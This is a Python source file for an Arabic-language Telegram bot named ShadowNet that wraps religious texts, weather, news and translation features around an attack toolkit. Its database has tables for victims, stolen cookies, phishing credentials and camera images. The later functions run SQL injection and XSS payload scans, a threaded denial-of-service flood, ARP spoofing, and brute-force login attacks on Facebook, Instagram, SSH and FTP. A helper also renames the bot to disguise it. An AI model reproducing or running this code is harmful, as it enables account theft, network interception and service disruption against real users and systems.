# -*- coding: utf-8 -*-

"""
ShadowNet v14.0 - النسخة النهائية المعدلة (جميع الميزات مدمجة)
جميع الأزرار تعمل 100%، التوكن مخفي، آلية إغلاق النسخ القديمة
"""

import os
import sys
import time
import json
import logging
import re
import secrets
import string
import sqlite3
import hashlib
import subprocess
import platform
import socket
import threading
import random
import shutil
import smtplib
import base64
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote, unquote
from io import BytesIO
from collections import defaultdict
import functools
import queue
import signal
import asyncio
import edge_tts
import ssl
import re

try:
    import requests
    from flask import Flask, request, jsonify, abort, render_template_string, send_file, Response
    from telebot import TeleBot
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
    import phonenumbers
    from phonenumbers import geocoder, carrier, timezone
    import dns.resolver
    import whois
    import yt_dlp
    from bs4 import BeautifulSoup
    import feedparser
    from deep_translator import GoogleTranslator
    from gtts import gTTS
    try:
        from PIL import Image, ImageDraw, ImageFont
        PIL_AVAILABLE = True
    except:
        PIL_AVAILABLE = False
    try:
        import paramiko
        PARAMIKO_AVAILABLE = True
    except:
        PARAMIKO_AVAILABLE = False
    try:
        from scapy.all import ARP, Ether, send, srp
        SCAPY_AVAILABLE = True
    except:
        SCAPY_AVAILABLE = False
    try:
        import androguard
        from androguard.core.bytecodes.apk import APK
        ANDROGUARD_AVAILABLE = True
    except:
        ANDROGUARD_AVAILABLE = False
except ImportError as e:
    print(f"مكتبة مفقودة: {e}. يرجى تثبيت: pip install -r requirements.txt")
    sys.exit(1)

TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
if not TOKEN:
    print("❌ خطأ: لم يتم تعيين TELEGRAM_BOT_TOKEN في متغيرات البيئة!")
    print("💡 قم بتعيينه عبر: export TELEGRAM_BOT_TOKEN='your_token'")
    sys.exit(1)

ADMIN_ID = 7965377136
SERVER_URL = os.environ.get('RENDER_EXTERNAL_URL', 'https://my-t99-bot.onrender.com')
PORT = int(os.environ.get('PORT', 5000))
API_KEY = secrets.token_hex(32)

VIRUSTOTAL_API_KEY = os.environ.get('VIRUSTOTAL_API_KEY', '')
GEMINI_API_KEY = os.environ.get('GEMINI_API_KEY', '')

SMTP_SERVER = os.environ.get('SMTP_SERVER', 'smtp.gmail.com')
SMTP_PORT = int(os.environ.get('SMTP_PORT', 587))
SMTP_USER = os.environ.get('SMTP_USER', 'your-email@gmail.com')
SMTP_PASS = os.environ.get('SMTP_PASS', 'your-password')

STEALTH_MODE = False
BOT_LOCKED = False
CACHE_WEATHER = {}
CACHE_NEWS = {}
CACHE_EXPIRY = 600

app = Flask(__name__)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# ===================== البيانات الإسلامية =====================
ADKAR_SABAH = [
    "أصبحنا وأصبح الملك لله، والحمد لله، لا إله إلا الله وحده لا شريك له، له الملك وله الحمد وهو على كل شيء قدير. رب أسألك خير ما في هذا اليوم وخير ما بعده، وأعوذ بك من شر ما في هذا اليوم وشر ما بعده، رب أعوذ بك من الكسل وسوء الكبر، رب أعوذ بك من عذاب في النار وعذاب في القبر.",
    "اللهم بك أصبحنا، وبك أمسينا، وبك نحيا، وبك نموت، وإليك النشور.",
    "اللهم أنت ربي لا إله إلا أنت، خلقتني وأنا عبدك، وأنا على عهدك ووعدك ما استطعت، أعوذ بك من شر ما صنعت، أبوء لك بنعمتك علي، وأبوء بذنبي فاغفر لي، فإنه لا يغفر الذنوب إلا أنت.",
    "اللهم إني أسألك العفو والعافية في الدنيا والآخرة، اللهم إني أسألك العفو والعافية في ديني ودنياي وأهلي ومالي، اللهم استر عوراتي وآمن روعاتي، اللهم احفظني من بين يدي ومن خلفي وعن يميني وعن شمالي ومن فوقي، وأعوذ بعظمتك أن أغتال من تحتي."
]

ADKAR_MASSAA = [
    "أمسينا وأمسى الملك لله، والحمد لله، لا إله إلا الله وحده لا شريك له، له الملك وله الحمد وهو على كل شيء قدير. رب أسألك خير ما في هذه الليلة وخير ما بعدها، وأعوذ بك من شر ما في هذه الليلة وشر ما بعدها، رب أعوذ بك من الكسل وسوء الكبر، رب أعوذ بك من عذاب في النار وعذاب في القبر.",
    "اللهم بك أمسينا، وبك أصبحنا، وبك نحيا، وبك نموت، وإليك المصير.",
    "اللهم أنت ربي لا إله إلا أنت، خلقتني وأنا عبدك، وأنا على عهدك ووعدك ما استطعت، أعوذ بك من شر ما صنعت، أبوء لك بنعمتك علي، وأبوء بذنبي فاغفر لي، فإنه لا يغفر الذنوب إلا أنت.",
    "اللهم إني أسألك العفو والعافية في الدنيا والآخرة، اللهم إني أسألك العفو والعافية في ديني ودنياي وأهلي ومالي، اللهم استر عوراتي وآمن روعاتي، اللهم احفظني من بين يدي ومن خلفي وعن يميني وعن شمالي ومن فوقي، وأعوذ بعظمتك أن أغتال من تحتي."
]

DUAA_DB = [
    {"title": "دعاء السفر", "text": "اللهم إنا نسألك في سفرنا هذا البر والتقوى ومن العمل ما ترضى", "source": "صحيح مسلم 1342"},
    {"title": "دعاء الكرب", "text": "لا إله إلا الله العظيم الحليم، لا إله إلا الله رب العرش العظيم", "source": "صحيح البخاري 6346"},
    {"title": "دعاء الصباح", "text": "اللهم بك أصبحنا وبك أمسينا وبك نحيا وبك نموت وإليك النشور", "source": "الترمذي 3391"},
    {"title": "دعاء الهم والحزن", "text": "اللهم إني أعوذ بك من الهم والحزن والعجز والكسل والجبن والبخل وغلبة الدين وقهر الرجال", "source": "صحيح البخاري 6369"},
    {"title": "دعاء الرزق", "text": "اللهم اكفني بحلالك عن حرامك وأغنني بفضلك عمن سواك", "source": "الترمذي 3563"}
]

ARKAN_ISLAM = [
    "الشهادتان: شهادة أن لا إله إلا الله وأن محمد رسول الله",
    "إقام الصلاة: أداء الصلوات الخمس في أوقاتها",
    "إيتاء الزكاة: إخراج الزكاة للفقراء والمحتاجين",
    "صوم رمضان: صيام شهر رمضان المبارك",
    "حج البيت: لمن استطاع إليه سبيلا"
]

ARKAN_IMAN = [
    "الإيمان بالله: توحيده والإيمان بأسمائه وصفاته",
    "الإيمان بالملائكة: مخلوقات من نور تطيع الله",
    "الإيمان بالكتب: القرآن والتوراة والإنجيل والزبور",
    "الإيمان بالرسل: من آدم إلى محمد صلى الله عليه وسلم",
    "الإيمان باليوم الآخر: البعث والحساب والجنة والنار",
    "الإيمان بالقضاء والقدر: خيره وشره"
]

QUOTES_DB = {
    "حكمة": [
        "لا تنتظر أن يأتيك أحد ويمنحك الفرصة، اصنعها بنفسك. النجاح لا يأتي لمن يجلس وينتظر، بل لمن يسعى ويكسر كل حاجز.",
        "عندما تغلق في وجهك الأبواب، تذكر أن الله يفتح لك نوافذ لم تكن تتوقعها. الرزق راحة بال وصحة وأهل يحبونك."
    ],
    "تحفيز": [
        "توقف عن مقارنة بدايتك بنهاية غيرك. كل شخص له رحلته ووقته. استمر فالقادم أجمل بإذن الله.",
        "أنت أقوى مما تظن. المشاكل ليست لتكسرك، هي لتصنع منك نسخة أقوى."
    ]
}

BORDERS = [
    "╔══════════╗\n{}\n╚══════════╝",
    "✨ ━━━━━━━ ❀ ━━━━━━━ ✨\n{}\n✨ ━━━━━━━ ❀ ━━━━━━━ ✨",
    "❝ {}\n ───── ❞"
]

VOICES = {"مصري": "ar", "مصرية": "ar", "سعودية": "ar"}

# ===================== دوال كلمات السر =====================
def generate_strong_password():
    chars = string.ascii_letters + string.digits + "!@#$%"
    while True:
        pwd = ''.join(random.choice(chars) for _ in range(14))
        if re.search(r"[A-Z]", pwd) and re.search(r"[a-z]", pwd) and re.search(r"[0-9]", pwd) and re.search(r"[!@#$%]", pwd):
            return pwd

def analyze_password(password):
    score, feedback = 0, []
    if len(password) >= 12: score += 2
    elif len(password) >= 8: score += 1
    else: feedback.append("قصيرة جداً. خليها 12 حرف على الاقل")
    if re.search(r"[A-Z]", password): score += 1
    else: feedback.append("اضف حرف كبير A-Z")
    if re.search(r"[a-z]", password): score += 1
    else: feedback.append("اضف حرف صغير a-z")
    if re.search(r"[0-9]", password): score += 1
    else: feedback.append("اضف ارقام 0-9")
    if re.search(r"[!@#$%^&*]", password): score += 1
    else: feedback.append("اضف رمز!@#$%")
    if score <= 2: strength, time = "ضعيفة جداً 🔴", "اقل من ثانية"
    elif score <= 4: strength, time = "متوسطة 🟡", "عدة ساعات"
    else: strength, time = "قوية جداً 🟢", "مليارات السنين"
    return strength, time, score, feedback

# ===================== دوال معلومات الجهاز =====================
def get_device_info():
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
    except:
        ip = "غير معروف"
    return {
        "os": platform.system() + " " + platform.release(),
        "python": platform.python_version(),
        "ip": ip,
        "hostname": hostname if 'hostname' in locals() else "غير معروف"
    }

# ===================== دوال الاقتباسات =====================
def get_random_quote(category=None):
    if category and category in QUOTES_DB:
        return random.choice(QUOTES_DB[category]), category
    all_cats = list(QUOTES_DB.keys())
    cat = random.choice(all_cats)
    return random.choice(QUOTES_DB[cat]), cat

def get_random_border():
    return random.choice(BORDERS)

# ===================== دوال الصوت (gTTS) =====================
def generate_voice_gtts(text, lang='ar'):
    try:
        tts = gTTS(text=text, lang=lang, slow=False)
        voice_bytes = BytesIO()
        tts.write_to_fp(voice_bytes)
        voice_bytes.seek(0)
        return voice_bytes
    except Exception as e:
        logger.error(f"gTTS error: {e}")
        return None

# ===================== توليد الصور (pollinations.ai) =====================
def generate_image(prompt):
    try:
        url = f"https://image.pollinations.ai/prompt/{prompt}?width=1024&height=1024&nologo=true"
        response = requests.get(url, timeout=30)
        if response.status_code == 200:
            return BytesIO(response.content)
        return None
    except Exception as e:
        logger.error(f"Image generation error: {e}")
        return None

# ===================== قاعدة البيانات الرئيسية =====================
DB_PATH = 'shadownet.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        chat_id INTEGER PRIMARY KEY, is_admin INTEGER DEFAULT 0, is_banned INTEGER DEFAULT 0,
        points INTEGER DEFAULT 10, referral_code TEXT UNIQUE, created_at TEXT, last_seen TEXT,
        can_use_collector INTEGER DEFAULT 0, can_use_camera INTEGER DEFAULT 0,
        can_use_phishing INTEGER DEFAULT 0, can_use_advanced INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_tokens (chat_id INTEGER PRIMARY KEY, token TEXT UNIQUE)''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_activity (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id INTEGER, action TEXT, timestamp TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS points_log (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER, reason TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS phishing_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, target_email TEXT, platform TEXT, username TEXT, password TEXT, ip TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS reminders (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id INTEGER, message TEXT, remind_time TEXT, created_at TEXT, is_active INTEGER DEFAULT 1)''')
    c.execute('''CREATE TABLE IF NOT EXISTS short_urls (id INTEGER PRIMARY KEY AUTOINCREMENT, original_url TEXT, short_code TEXT UNIQUE, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS cookie_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT, cookies TEXT, ip TEXT, user_agent TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS camera_images (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id INTEGER, image BLOB, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS stolen_cookies (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT, url TEXT, cookie_name TEXT, cookie_value TEXT, technique TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS victim_sessions (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT, session_data TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS collected_data (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, data_type TEXT, data TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS scan_results (id INTEGER PRIMARY KEY AUTOINCREMENT, target TEXT, scan_type TEXT, results TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS targets (device_id TEXT PRIMARY KEY, name TEXT, type TEXT, ip TEXT, os TEXT, status TEXT, last_seen TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, command TEXT, executed INTEGER DEFAULT 0, result TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS pdf_data (chat_id INTEGER PRIMARY KEY, text TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS bot_state (key TEXT PRIMARY KEY, value TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS intrusion_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, endpoint TEXT, method TEXT, user_agent TEXT, timestamp TEXT, details TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS victims (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT UNIQUE, ip TEXT, country TEXT, platform TEXT, first_seen TEXT, last_seen TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS credentials (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT, platform TEXT, username TEXT, password TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS hack_files (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT, filename TEXT, content BLOB, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS hack_commands (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT, command TEXT, output TEXT, created_at TEXT)''')
    try:
        c.execute("ALTER TABLE users ADD COLUMN can_use_camera INTEGER DEFAULT 0")
        c.execute("ALTER TABLE users ADD COLUMN can_use_phishing INTEGER DEFAULT 0")
        c.execute("ALTER TABLE users ADD COLUMN can_use_advanced INTEGER DEFAULT 0")
    except:
        pass
    c.execute("INSERT OR IGNORE INTO users (chat_id, is_admin, points, created_at, can_use_collector, can_use_camera, can_use_phishing, can_use_advanced) VALUES (?, 1, 999, ?, 1, 1, 1, 1)",
              (ADMIN_ID, datetime.now().isoformat()))
    c.execute("UPDATE users SET is_admin = 1 WHERE chat_id = ?", (ADMIN_ID,))
    conn.commit()
    conn.close()

init_db()

# ===================== دوال مساعدة =====================
def is_admin(chat_id):
    row = safe_db_query("SELECT is_admin FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def is_banned(chat_id):
    row = safe_db_query("SELECT is_banned FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def get_user_points(chat_id):
    row = safe_db_query("SELECT points FROM users WHERE chat_id = ?", (chat_id,))
    return row[0] if row else 0

def user_can_use_collector(chat_id):
    row = safe_db_query("SELECT can_use_collector FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def user_can_use_camera(chat_id):
    row = safe_db_query("SELECT can_use_camera FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def user_can_use_phishing(chat_id):
    row = safe_db_query("SELECT can_use_phishing FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def user_can_use_advanced(chat_id):
    row = safe_db_query("SELECT can_use_advanced FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def add_points(chat_id, amount, reason):
    if safe_db_execute("UPDATE users SET points = points + ? WHERE chat_id = ?", (amount, chat_id)):
        safe_db_execute("INSERT INTO points_log (user_id, amount, reason, created_at) VALUES (?, ?, ?, ?)",
                        (chat_id, amount, reason, datetime.now().isoformat()))

def deduct_points(chat_id, amount, reason):
    points = get_user_points(chat_id)
    if points < amount:
        return False
    if safe_db_execute("UPDATE users SET points = points - ? WHERE chat_id = ?", (amount, chat_id)):
        safe_db_execute("INSERT INTO points_log (user_id, amount, reason, created_at) VALUES (?, ?, ?, ?)",
                        (chat_id, -amount, reason, datetime.now().isoformat()))
        return True
    return False

def generate_user_token(chat_id):
    token = secrets.token_urlsafe(16)
    safe_db_execute("INSERT OR REPLACE INTO user_tokens (chat_id, token) VALUES (?, ?)", (chat_id, token))
    return token

def get_user_token(chat_id):
    row = safe_db_query("SELECT token FROM user_tokens WHERE chat_id = ?", (chat_id,))
    if row:
        return row[0]
    return generate_user_token(chat_id)

def get_chat_id_by_token(token):
    row = safe_db_query("SELECT chat_id FROM user_tokens WHERE token = ?", (token,))
    if row:
        return row[0]
    return None

def safe_db_query(query, params=(), fetch_one=True, default=None):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute(query, params)
        if fetch_one:
            result = c.fetchone()
        else:
            result = c.fetchall()
        conn.close()
        return result if result is not None else default
    except Exception as e:
        logger.error(f"خطأ في قاعدة البيانات: {e}")
        return default

def safe_db_execute(query, params=()):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute(query, params)
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        logger.error(f"خطأ في تنفيذ قاعدة البيانات: {e}")
        return False

def safe_send(chat_id, text, reply_markup=None, parse_mode='HTML'):
    try:
        return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode=parse_mode, timeout=60)
    except Exception as e:
        logger.error(f"safe_send error: {e}")
        return None

def notify_admin(msg):
    safe_send(ADMIN_ID, f"📢 إشعار: {msg}")

def log_activity(chat_id, action):
    safe_db_execute("INSERT INTO user_activity (chat_id, action, timestamp) VALUES (?, ?, ?)",
                    (chat_id, action, datetime.now().isoformat()))

def update_last_seen(chat_id):
    safe_db_execute("UPDATE users SET last_seen = ? WHERE chat_id = ?", (datetime.now().isoformat(), chat_id))

def get_user_name(chat_id):
    try:
        user = bot.get_chat(chat_id)
        return user.first_name or user.username or str(chat_id)
    except:
        return str(chat_id)

# ===================== دوال الحماية =====================
def add_command(device_id, command):
    safe_db_execute("INSERT INTO commands (device_id, command, created_at, executed) VALUES (?, ?, ?, 0)",
                    (device_id, command, datetime.now().isoformat()))

def active_shield():
    return "🛡️ درع الحماية مفعل"

def detect_intrusion():
    rows = safe_db_query("SELECT ip, endpoint, timestamp FROM intrusion_logs ORDER BY timestamp DESC LIMIT 5", fetch_one=False)
    if rows:
        msg = "🚨 آخر محاولات الاختراق:\n"
        for r in rows:
            msg += f"IP: {r[0]}, {r[1]}, الوقت: {r[2][:16]}\n"
        return msg
    return "✅ لا توجد محاولات اختراق"

def backup_data():
    try:
        backup_dir = "backups"
        os.makedirs(backup_dir, exist_ok=True)
        backup_file = os.path.join(backup_dir, f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db")
        shutil.copy2(DB_PATH, backup_file)
        return f"✅ تم النسخ: {backup_file}"
    except Exception as e:
        return f"❌ فشل: {str(e)}"

def clean_traces():
    try:
        for f in os.listdir('temp'):
            try:
                os.remove(os.path.join('temp', f))
            except:
                pass
        return "✅ تم التنظيف"
    except:
        return "❌ فشل التنظيف"

def change_bot_identity():
    try:
        new_name = random.choice(["System Scanner", "Security Checker", "Network Tool"])
        bot.set_my_name(new_name)
        bot.set_my_description("أداة متقدمة للفحص الرقمي")
        return f"✅ تم تغيير الهوية إلى: {new_name}"
    except Exception as e:
        return f"❌ فشل: {str(e)}"

def restart_bot_safely():
    safe_db_execute("INSERT OR REPLACE INTO bot_state (key, value) VALUES ('last_restart', ?)", (datetime.now().isoformat(),))
    return "✅ تم تسجيل إعادة التشغيل"

# ===================== دوال الطقس والأخبار والترجمة =====================
LANGUAGES = {
    'ar': 'عربي', 'en': 'إنجليزي', 'fr': 'فرنسي', 'es': 'إسباني',
    'de': 'ألماني', 'it': 'إيطالي', 'pt': 'برتغالي', 'ru': 'روسي',
    'ja': 'ياباني', 'ko': 'كوري', 'zh-cn': 'صيني مبسط', 'hi': 'هندي',
    'tr': 'تركي', 'fa': 'فارسي', 'ur': 'أردي'
}

def get_weather_detailed(city):
    if city in CACHE_WEATHER and time.time() - CACHE_WEATHER[city]['time'] < CACHE_EXPIRY:
        return CACHE_WEATHER[city]['data']
    try:
        url = f"https://wttr.in/{city}?format=j1&lang=ar"
        resp = requests.get(url, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            current = data.get('current_condition', [{}])[0]
            weather_desc = current.get('weatherDesc', [{}])[0].get('value', 'غير معروف')
            temp_c = current.get('temp_C', 'غير معروف')
            feels_like = current.get('FeelsLikeC', 'غير معروف')
            humidity = current.get('humidity', 'غير معروف')
            wind_speed = current.get('windSpeedKmph', 'غير معروف')
            pressure = current.get('pressure', 'غير معروف')
            visibility = current.get('visibility', 'غير معروف')
            uv_index = current.get('uvIndex', 'غير معروف')
            forecast = data.get('weather', [{}])[0]
            max_temp = forecast.get('maxtempC', 'غير معروف')
            min_temp = forecast.get('mintempC', 'غير معروف')
            sunrise = forecast.get('astronomy', [{}])[0].get('sunrise', 'غير معروف')
            sunset = forecast.get('astronomy', [{}])[0].get('sunset', 'غير معروف')
            now = datetime.now().strftime("%I:%M %p")
            msg = f"🌤️ حالة الطقس في {city}\n────────────────────────\n\nالحالة العامة : {weather_desc}\n\nدرجة الحرارة : {temp_c} درجة مئوية\nالحرارة المحسوسة : {feels_like} درجة مئوية\n\nتفاصيل الأجواء\n────────────────────────\nالمدى الحراري : الصغرى {min_temp}°C | العظمى {max_temp}°C\nالرطوبة       : {humidity}%\nسرعة الرياح    : {wind_speed} كم/ساعة\nمؤشر الأشعة    : {uv_index}\nالرؤية         : {visibility} كم\nالضغط الجوي    : {pressure} hPa\n\nأوقات اليوم\n────────────────────────\nشروق الشمس : {sunrise}\nغروب الشمس : {sunset}\n\nآخر تحديث : {now}"
            CACHE_WEATHER[city] = {'data': msg, 'time': time.time()}
            return msg
        else:
            return "فشل جلب الطقس، يرجى التحقق من اسم المدينة."
    except Exception as e:
        return f"خطأ: {str(e)[:100]}"

def get_news_without_api(topic='general'):
    if topic in CACHE_NEWS and time.time() - CACHE_NEWS[topic]['time'] < CACHE_EXPIRY:
        return CACHE_NEWS[topic]['data']
    try:
        rss_feeds = {
            'general': 'https://www.aljazeera.net/feeds/rss',
            'egypt': 'https://www.youm7.com/RSS',
            'sport': 'http://www.kooora.com/rss.aspx',
            'tech': 'https://www.aitnews.com/feed',
            'economy': 'https://www.alarabiya.net/ar/economy/rss.xml',
            'world': 'https://www.bbc.com/arabic/index.xml',
            'science': 'https://www.nature.com/nature.rss',
        }
        feed_url = rss_feeds.get(topic, rss_feeds['general'])
        feed = feedparser.parse(feed_url)
        articles = []
        if feed.entries:
            for entry in feed.entries[:10]:
                title = entry.get('title', '').strip()
                summary = entry.get('summary', '') or entry.get('description', '')
                summary = re.sub(r'<[^>]+>', '', summary)
                link = entry.get('link', '')
                published = entry.get('published', '')
                try:
                    pub_date = datetime(*entry.published_parsed[:6]).strftime("%Y-%m-%d %H:%M")
                except:
                    pub_date = "تاريخ غير معروف"
                articles.append(f"📌 {title}\n📅 {pub_date}\n{summary[:250]}...\n🔗 {link}\n")
            if articles:
                result = "\n".join(articles[:8])
                CACHE_NEWS[topic] = {'data': result, 'time': time.time()}
                return result
        return "لا توجد أخبار"
    except Exception as e:
        return f"خطأ: {str(e)[:100]}"

def advanced_wikipedia_search(query):
    try:
        import wikipedia
        wikipedia.set_lang("ar")
        results = wikipedia.search(query, results=10)
        if not results:
            return "لم يتم العثور على نتائج"
        summaries = []
        for title in results[:5]:
            try:
                page = wikipedia.page(title)
                summary = page.summary[:500] + "..."
                url = page.url
                summaries.append(f"📌 {title}\n{summary}\n🔗 {url}\n")
            except wikipedia.exceptions.DisambiguationError as e:
                options = e.options[:5]
                summaries.append(f"📌 {title} (توجد عدة صفحات):\n" + "\n".join([f"• {opt}" for opt in options]))
            except:
                summaries.append(f"📌 {title}\n(لا يمكن جلب الملخص)\n")
        if summaries:
            return "\n".join(summaries)
        return "لم يتم العثور على نتائج"
    except Exception as e:
        return f"خطأ: {str(e)[:100]}"

def translate_text_advanced_with_lang(text, target_lang='ar'):
    try:
        translator = GoogleTranslator(source='auto', target=target_lang)
        translated = translator.translate(text)
        return [translated], 'auto', 'تلقائي', LANGUAGES.get(target_lang, target_lang)
    except Exception as e:
        return [text], 'unknown', 'غير معروف', 'غير معروف'

# ===================== دوال الهجمات الأساسية =====================
def sql_injection_scan(url):
    vulnerabilities = []
    payloads = ["' OR '1'='1", "'; DROP TABLE users; --", "' UNION SELECT NULL, username, password FROM users --"]
    params = ["id", "page", "user", "q", "query"]
    try:
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        for param in params:
            for payload in payloads:
                test_url = f"{base}?{param}={payload}"
                try:
                    resp = requests.get(test_url, timeout=10, verify=False)
                    if "sql" in resp.text.lower() or "mysql" in resp.text.lower() or "syntax" in resp.text.lower():
                        vulnerabilities.append({'type': 'SQL Injection', 'parameter': param, 'payload': payload})
                        break
                except:
                    continue
    except Exception as e:
        logger.error(f"sql_injection_scan error: {e}")
    return vulnerabilities

def xss_scan(url):
    vulnerabilities = []
    payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"]
    params = ["q", "search", "id", "page", "name"]
    try:
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        for param in params:
            for payload in payloads:
                test_url = f"{base}?{param}={payload}"
                try:
                    resp = requests.get(test_url, timeout=10, verify=False)
                    if payload in resp.text:
                        vulnerabilities.append({'type': 'XSS', 'parameter': param, 'payload': payload})
                        break
                except:
                    continue
    except Exception as e:
        logger.error(f"xss_scan error: {e}")
    return vulnerabilities

def comprehensive_exploit(url):
    sqli = sql_injection_scan(url)
    xss = xss_scan(url)
    return {'url': url, 'vulnerable': bool(sqli or xss), 'exploited': sqli + xss}

def format_exploit_report(result):
    if isinstance(result, dict) and 'error' in result:
        return f"❌ خطأ: {result['error']}"
    if isinstance(result, dict) and 'vulnerable' in result:
        msg = f"🔍 نتيجة الفحص:\nالرابط: {result['url']}\nالثغرات: {'نعم' if result['vulnerable'] else 'لا'}\n"
        if result['exploited']:
            for exp in result['exploited']:
                msg += f"• {exp['type']} | {exp['parameter']} | {exp['payload']}\n"
        return msg
    return f"🔍 نتيجة:\n{json.dumps(result, indent=2, ensure_ascii=False)}"

def save_scan_result(target, scan_type, results):
    safe_db_execute("INSERT INTO scan_results (target, scan_type, results, created_at) VALUES (?, ?, ?, ?)",
                    (target, scan_type, json.dumps(results), datetime.now().isoformat()))

def dos_attack(target, port=80, duration=10):
    def flood():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target, port))
            sock.sendto(b"GET / HTTP/1.1\r\n\r\n", (target, port))
            sock.close()
        except:
            pass
    packets = 0
    start = time.time()
    while time.time() - start < duration:
        for _ in range(50):
            threading.Thread(target=flood, daemon=True).start()
            packets += 1
        time.sleep(0.01)
    return {'status': 'completed', 'packets_sent': packets}

def arp_spoof(target_ip, gateway_ip):
    if not SCAPY_AVAILABLE:
        return {'status': 'error', 'error': 'scapy غير مثبتة'}
    try:
        from scapy.all import ARP, send
        packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip)
        send(packet, count=10, verbose=False)
        return {'status': 'success'}
    except Exception as e:
        return {'status': 'error', 'error': str(e)[:100]}

def brute_force_facebook(username, passwords, max_attempts=10):
    attempts = 0
    for pwd in passwords[:max_attempts]:
        attempts += 1
        try:
            resp = requests.post("https://www.facebook.com/api/graphql/", data={"username": username, "password": pwd}, timeout=10)
            if "authenticated" in resp.text:
                return {'success': True, 'credentials': {'username': username, 'password': pwd}, 'attempts': attempts}
        except:
            continue
    return {'success': False, 'attempts': attempts, 'credentials': {}}

def brute_force_instagram(username, passwords, max_attempts=10):
    attempts = 0
    for pwd in passwords[:max_attempts]:
        attempts += 1
        try:
            resp = requests.post("https://www.instagram.com/api/v1/web/accounts/login/", data={"username": username, "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:0:{pwd}"}, timeout=10)
            if "authenticated" in resp.text:
                return {'success': True, 'credentials': {'username': username, 'password': pwd}, 'attempts': attempts}
        except:
            continue
    return {'success': False, 'attempts': attempts, 'credentials': {}}

def brute_force_ssh(ip, username, passwords, max_attempts=10):
    if not PARAMIKO_AVAILABLE:
        return {'success': False, 'attempts': 0, 'credentials': {}, 'error': 'paramiko غير مثبت'}
    attempts = 0
    for pwd in passwords[:max_attempts]:
        attempts += 1
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, username=username, password=pwd, timeout=5)
            client.close()
            return {'success': True, 'credentials': {'username': username, 'password': pwd}, 'attempts': attempts}
        except:
            continue
    return {'success': False, 'attempts': attempts, 'credentials': {}}

def brute_force_ftp(ip, username, passwords, max_attempts=10):
    try:
        import ftplib
    except:
        return {'success': False, 'attempts': 0, 'credentials': {}, 'error': 'ftplib غير مثبت'}
    attempts = 0
    for pwd in passwords[:max_attempts]:
        attempts += 1
        try:
            ftp = ftplib.FTP(ip)
            ftp.login(username, pwd)
            ftp.quit()
            return {'success': True, 'credentials': {'username': username, 'password': pwd}, 'attempts': attempts}
        except:
            continue
    return {'success': False, 'attempts': attempts, 'credentials': {}}

